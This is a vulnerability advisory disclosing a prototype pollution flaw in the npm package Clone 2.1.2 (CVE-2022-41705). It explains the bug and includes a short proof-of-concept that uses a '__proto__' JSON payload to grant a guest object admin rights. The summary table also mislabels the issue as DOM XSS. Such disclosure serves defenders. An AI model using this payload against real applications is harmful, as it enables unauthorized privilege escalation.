---
slug: advisories/guetta/
title: Clone 2.1.2 - Prototype Pollution
authors: Carlos Bello
writer: cbello
codename: guetta
product: Clone 2.1.2
date: 2022-10-13 03:30 COT
cveid: CVE-2022-41705
severity: 9.1
description: Clone 2.1.2   -   Prototype Pollution Vulnerability
keywords: Fluid Attacks, Security, Vulnerabilities, Clone, Prototype Pollution, Electron, NPM
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                       |                                                        |
| --------------------- | -------------------------------------------------------|
| **Name**              | Clone 2.1.2  -  DOM XSS to Account Takeover            |
| **Code name**         | [Guetta](https://en.wikipedia.org/wiki/David_Guetta)   |
| **Product**           | Clone                                                  |
| **Affected versions** | Version 2.1.2                                          |
| **State**             | Public                                                 |
| **Release date**      | 2022-10-13                                             |

## Vulnerability

|                       |                                                                                                        |
| --------------------- | ------------------------------------------------------------------------------------------------------ |
| **Kind**              | Prototype Pollution                                                                                    |
| **Rule**              | [390. Prototype Pollution](https://docs.fluidattacks.com/criteria/vulnerabilities/390)                 |
| **Remote**            | Yes                                                                                                    |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H                                                           |
| **CVSSv3 Base Score** | 9.1                                                                                                    |
| **Exploit available** | Yes                                                                                                    |
| **CVE ID(s)**         | [CVE-2022-41705](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41705)                        |

## Description

Clone version 2.1.2 allows an external attacker to edit or add new
properties to the object that receives the clone. This is possible
because the application does not properly validate the keys of the
incoming JSON, thus allowing it to edit the  `__proto__`  property,
which will inherit the object receiving the clone.

## Vulnerability

Prototype pollution is a vulnerability that affects JS. It occurs
when a third party manages to modify the `__proto__` of an object.
JavaScript first checks if such a method/attribute exists in the
object. If so, then it calls it. If not, it looks in the object's
prototype. If the method/attribute is also not in the object's
prototype, then the property is said to be undefined.

Therefore, if an attacker manages to inject a `__proto__` property,
through insecure operations such as deepclone, merge, etc. He will
manage to inject or edit the properties of an application object as
shown in the following example:

## Exploitation

### poc.js

```js
var clone = require('clone');

var admin = { isAdmin : true };
var guest = { name : "guest" };

var malicious_payload = '{"__proto__":{"isAdmin":true}}'; // HTTP Request

console.log("\nGuest isAdmin? => " + guest.isAdmin);      // undefined
guest = clone(JSON.parse(malicious_payload));             // hack
console.log("Guest.isAdmin? => " + guest.isAdmin + "\n"); // true
```

## Our security police

We have reserved the CVE-2022-41705 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: Clone 2.1.2
* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from the Offensive
Team of `Fluid Attacks`.

## References

**Vendor page** <https://github.com/pvorb/clone>

## Timeline

<time-lapse
  discovered="2022-09-19"
  contacted="2022-09-19"
  replied="2022-09-19"
  confirmed=""
  patched=""
  disclosure="2022-10-13">
</time-lapse>
